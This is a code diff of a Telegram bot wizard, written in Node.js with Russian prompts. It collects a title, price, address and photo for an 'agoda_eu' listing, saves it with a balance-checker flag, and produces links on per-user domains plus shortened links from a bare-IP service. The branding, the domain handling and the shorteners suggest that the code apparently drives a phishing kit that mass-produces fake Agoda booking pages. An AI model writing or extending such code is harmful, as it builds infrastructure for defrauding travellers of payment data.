@@ -4,10 +4,10 @@ const locale = require("../../locale");
 const escapeHTML = require("escape-html");
 const { Markup } = require("telegraf");
 const log = require("../../helpers/log");
-const cheerio = require("cheerio");
+const myAd = require("../../commands/myAd");
 const { default: axios } = require("axios");
 const rand = require("../../helpers/rand");
-const myAd = require("../../commands/myAd");
+
 const downloadImage = require("../../helpers/downloadImage");
 
 const scene = new WizardScene(
@@ -33,18 +33,10 @@ const scene = new WizardScene(
   },
   async (ctx) => {
     try {
-      const user = await User.findOne({ where: { id: ctx.from.id } });
       await ctx.deleteMessage().catch((err) => err);
       await ctx.scene
-        .reply("Введите название", {
+        .reply("Введите название объекта", {
           reply_markup: Markup.inlineKeyboard([
-            [
-              Markup.callbackButton(
-                `${!user.LastTitle ? `Пусто` : user.LastTitle}`,
-                `${!user.LastTitle ? `none` : user.LastTitle}`
-              ),
-            ],
-
             [Markup.callbackButton("Отменить", "cancel")],
           ]),
         })
@@ -58,15 +50,9 @@ const scene = new WizardScene(
   },
   async (ctx) => {
     try {
-      const user = await User.findOne({ where: { id: ctx.from.id } });
+      if (!ctx.message?.text) return ctx.wizard.prevStep();
 
-      if (!ctx.message?.text && ctx.callbackQuery?.data != `${user.LastTitle}`)
-        return ctx.wizard.prevStep();
-
-      if (ctx.callbackQuery?.data == `${user.LastTitle}`) {
-        ctx.scene.state.data.title = `${user.LastTitle}`;
-      } else ctx.scene.state.data.title = ctx.message.text;
-
+      ctx.scene.state.data.title = ctx.message.text;
       return ctx.wizard.nextStep();
     } catch (err) {
       console.log(err);
@@ -91,12 +77,8 @@ const scene = new WizardScene(
   },
   async (ctx) => {
     try {
-      var amount = parseFloat(ctx.message.text);
-      if (isNaN(amount)) return ctx.wizard.prevStep();
-      if (amount % 1 == 0) amount = amount.toFixed(0);
-      else amount = amount.toFixed(2);
+      var amount = ctx.message.text;
 
-      amount = amount + " €";
 
       ctx.scene.state.data.price = amount;
 
@@ -107,48 +89,6 @@ const scene = new WizardScene(
     }
   },
 
-  // async (ctx) => {
-  //   try {
-  //     const user = await User.findOne({ where: { id: ctx.from.id } });
-  //     await ctx.deleteMessage().catch((err) => err);
-  //     await ctx.scene
-  //       .reply("Введите локацию объекта", {
-  //         reply_markup: Markup.inlineKeyboard([
-  //           [
-  //             Markup.callbackButton(
-  //               `${!user.LastAbout ? `Пусто` : user.LastAbout}`,
-  //               `${!user.LastAbout ? `none` : user.LastAbout}`
-  //             ),
-  //           ],
-
-  //           [Markup.callbackButton("Отменить", "cancel")],
-  //         ]),
-  //       })
-  //       .catch((err) => err);
-  //     return ctx.wizard.next();
-  //   } catch (err) {
-  //     console.log(err);
-  //     ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
-  //     return ctx.scene.leave();
-  //   }
-  // },
-  // async (ctx) => {
-  //   try {
-  //     const user = await User.findOne({ where: { id: ctx.from.id } });
-
-  //     if (!ctx.message?.text && ctx.callbackQuery?.data != `${user.LastAbout}`)
-  //       return ctx.wizard.prevStep();
-
-  //     if (ctx.callbackQuery?.data == `${user.LastAbout}`) {
-  //       ctx.scene.state.data.about = `${user.LastAbout}`;
-  //     } else ctx.scene.state.data.about = ctx.message.text;
-  //     return ctx.wizard.nextStep();
-  //   } catch (err) {
-  //     console.log(err);
-  //     ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
-  //     return ctx.scene.leave();
-  //   }
-  // },
 
   async (ctx) => {
     try {
@@ -184,7 +124,7 @@ const scene = new WizardScene(
   async (ctx) => {
     try {
       await ctx.scene
-        .reply("Введите адрес", {
+        .reply("Введите адрес объекта", {
           reply_markup: Markup.inlineKeyboard([
             [Markup.callbackButton("Пропустить", "skip")],
 
@@ -211,15 +151,12 @@ const scene = new WizardScene(
       return ctx.scene.leave();
     }
   },
-
   async (ctx) => {
     try {
-      const user = await User.findOne({ where: { id: ctx.from.id } });
 
       await ctx.scene
-        .reply("Отправьте фото отеля", {
+        .reply("Отправьте изображение в сжатом формате", {
           reply_markup: Markup.inlineKeyboard([
-            // [Markup.callbackButton(`Последнее фото`, `LastPhoto`)],
 
             [Markup.callbackButton("Отменить", "cancel")],
           ]),
@@ -243,6 +180,7 @@ const scene = new WizardScene(
       ctx.wizard.state.data.photo = await downloadImage(photo_link);
       return ctx.wizard.nextStep();
     } catch (err) {
+      console.log(err)
       if (ctx.message.text) return ctx.wizard.prevStep();
 
       ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
@@ -264,84 +202,63 @@ const scene = new WizardScene(
       console.log(ctx.scene.state.data);
       const ad = await Ad.create({
         id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
-                version:'1',
-
         userId: ctx.from.id,
+        version: "1",
         balanceChecker: false,
         ...ctx.scene.state.data,
-        LastTitle: ctx.scene.state.data.title,
         serviceCode: "agoda_eu",
       });
 
-      await User.update(
-        {
-          LastTitle: ctx.scene.state.data.title,
-          LastAbout: ctx.scene.state.data.about,
-          LastPhoto: ctx.scene.state.data.photo,
-        },
-        {
-          where: {
-            id: ctx.from.id,
+      const domains = await MyDomains.findOne({
+        where: { userId: ctx.from.id },
+      });
+
+      let reductionUrl;
+
+      try {
+        const reduction = await axios.post(
+          "http://185.208.158.144/api/create",
+          {
+            target: `https://${service.domain}/${ad.id}`,
+            domain: service.shortlink || ctx.state.bot.shortlink,
           },
+          { timeout: 2000 }
+        );
+
+        reductionUrl = reduction.data.url;
+      } catch (error) {
+        console.error("Ошибка при создании сокращенной ссылки:", error.message);
+
+        if (error.code === 'ECONNABORTED') {
+          console.warn("Запрос превысил допустимый тайм-аут.");
+        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
+          console.warn("Сервер сокращений недоступен.");
+        } else {
+          console.warn("Произошла непредвиденная ошибка:", error.message);
         }
-      );
 
-      log(
-        ctx,
-        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
-      );
-      const domains = await MyDomains.findOne({ 
-        where: { userId: ctx.from.id }, 
-        }); 
-        
-        let reductionUrl; 
-        
-        try { 
-        const reduction = await axios.post( 
-        "http://185.208.158.144/api/create", 
-        { 
-        target: `https://${service.domain}/${ad.id}`, 
-        domain: service.shortlink || ctx.state.bot.shortlink, 
-        }, 
-        { timeout: 2000 } 
-        ); 
-        
-        reductionUrl = reduction.data.url; 
-        } catch (error) { 
-        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
-        
-        if (error.code === 'ECONNABORTED') { 
-        console.warn("Запрос превысил допустимый тайм-аут."); 
-        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
-        console.warn("Сервер сокращений недоступен."); 
-        } else { 
-        console.warn("Произошла непредвиденная ошибка:", error.message); 
-        } 
-        
-        reductionUrl = null; // корректный fallback 
-        } 
-        
-        const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
-        
-        await ad.update({ 
-        myDomainLink: personalDomainLink, 
-        shortLink: reductionUrl, // используем переменную 
-        }); 
-        
-log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 
+        reductionUrl = null;
+      }
 
-// Собираем сообщение 
-try {
-  await myAd(ctx, ad.id);
-} catch (err) {
-  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
-}
+      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null;
+
+      await ad.update({
+        myDomainLink: personalDomainLink,
+        shortLink: reductionUrl,
+      });
+
+      log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`);
+
+      try {
+        await myAd(ctx, ad.id);
+      } catch (err) {
+        await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => { });
+      }
       ctx.updateType = "message";
+      return ctx.scene.leave();
     } catch (err) {
       console.log(err);
-      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
     }
-    return ctx.scene.leave();
   }
 );
 
